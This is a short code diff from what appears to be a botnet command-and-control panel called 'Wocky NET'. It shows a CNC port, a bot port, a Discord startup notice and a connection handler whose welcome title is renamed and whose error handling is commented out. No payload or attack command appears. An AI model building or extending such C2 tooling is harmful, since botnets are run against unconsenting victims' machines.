@@ -32,15 +32,14 @@ print(f"Wocky Successfully started! | Cnc Port: {port} | Cnc Port: {bot_port}\r\
 Discord.send_news(f"Wocky NET Successsfully started!\r\n```Port {port}```")
 
 def handle_connection(client, addr):
+        # try:
         CLI_Control.set_TerminalSize(client, 40, 79)
-        CLI_Control.set_Title(client, "Welcome to Wocky NET!")
+        CLI_Control.set_Title(client, "Welcome to Society NET!")
         MainScreen(client, addr)
         while(True):
-                try:
-                        CMDHandler(client, addr)
-                except:
-                        socket.close()
-                        return "Failed"
+                CMDHandler(client, addr)
+        # except:
+        #         print("User disconnected")
 
 """ 
 The whole bot function was coded all here for testing reasons!
